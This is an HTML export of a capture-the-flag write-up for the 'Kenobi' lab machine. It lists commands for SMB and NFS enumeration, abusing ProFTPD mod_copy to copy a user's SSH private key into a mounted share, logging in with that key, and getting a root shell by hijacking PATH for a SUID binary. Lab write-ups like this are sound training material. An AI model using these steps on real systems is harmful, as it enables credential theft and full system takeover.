<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>kenobi</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>kenobi</h1><br/><p><strong><h1>Kenobi</h1></strong></p><p></p><p></p><p><strong><h2>Enumeration</h2></strong></p><p></p><p><strong>Nmap:</strong></p><p><img src="images/4-1.png" alt="images/4-1.png" /></p><p></p><p><strong>Enumerating Samba Shares using Nmap:</strong></p><p></p><p><strong>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.184.93</strong></p><p></p><p><img src="images/4-2.png" alt="images/4-2.png" /></p><p></p><p><strong>Enumerating Anonymous Share:</strong></p><p></p><p><strong>smbclient //10.10.184.93/anonymous</strong></p><p></p><p><img src="images/4-3.png" alt="images/4-3.png" /></p><p></p><p>We get the location of <strong>id_rsa</strong> through the log file.</p><p></p><p><strong>Enumerating NFS Share in Port 111 using Nmap:</strong></p><p></p><p><strong>nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.184.93</strong></p><p></p><p><img src="images/4-4.png" alt="images/4-4.png" /></p><p></p><p><strong>Mounting the NFS share:</strong></p><p></p><p><strong>mount 10.10.184.93:/var /mnt/kenobiNFS</strong></p><p></p><p><img src="images/4-5.png" alt="images/4-5.png" /></p><p>As we can see, after the mount the /var directory is accessible from our local machine.</p><p><strong>Note:</strong> /var/tmp has all permissions. (We can write to it)</p><p></p><p></p><p></p><p><strong>ProFTPD Vulnerability ( mod_copy module ):</strong></p><p></p><p>This vulnerability in ProFTPD allows copying of files. Following is the process.</p><p></p><p>Connect to ProFTPD through Netcat</p><p><strong>nc 10.10.184.93 21</strong></p><p><strong></strong></p><p><strong>SITE CPFR /home/kenobi/.ssh/id_rsa</strong></p><p><strong></strong></p><p><strong>SITE CPTO /var/tmp/id_rsa</strong></p><p></p><p><img src="images/4-6.png" alt="images/4-6.png" /></p><p></p><p>We can verify the copy by going into the mounted share.</p><p></p><p><img src="images/4-7.png" alt="images/4-7.png" /></p><p><strong><h2>Foothold</h2></strong></p><p></p><p><strong>SSH to the Machine with the id_rsa file:</strong></p><p></p><p>Copy the id_rsa from the NFS share to a local directory</p><p></p><p>change the permission on the file to 600</p><p></p><p><strong>chmod 600 id_rsa	</strong></p><p></p><p>ssh using the id_rsa</p><p></p><p><strong>ssh -i id_rsa kenobi@10.10.184.93</strong></p><p></p><p><img src="images/4-8.png" alt="images/4-8.png" /></p><p></p><p>User flag is present on kenobi&#39;s home directory.</p><p></p><p><strong><h2>Privilege Escalation</h2></strong></p><p></p><p>Lets search for files with SUID bit set.</p><p></p><p><strong>find / -type f -perm -04000 2&gt;/dev/null</strong></p><p></p><p><img src="images/4-9.png" alt="images/4-9.png" /></p><p>The executible <strong>/usr/bin/menu</strong> seems intresting. Lets run it.</p><p></p><p><img src="images/4-10.png" alt="images/4-10.png" /></p><p></p><p>The program has 3 options that runs 3 different programs in the background.</p><p>We can manipulate the path variable to create a malicious program that the menu program calls.</p><p></p><p>The 1st options seems to call the <strong>curl</strong> program</p><p>I will create a malicious curl program in the <strong>/tmp</strong> directory &amp; <strong>add it to path</strong>.</p><p></p><p><strong>cd /tmp</strong></p><p><strong>echo /bin/sh &gt; curl</strong></p><p><strong>chmod a+x curl</strong></p><p><strong>export PATH=/tmp:$PATH</strong></p><p></p><p>Next, run the program <strong>/usr/bin/menu</strong> &amp; select <strong>option 1</strong> to get <strong>root shell</strong>.</p><p></p><p><img src="images/4-11.png" alt="images/4-11.png" /></p><p></p><p>We find the root flag in the /root directory.</p><p></p><p>Thanks!!</p></div>
</body>
</html>
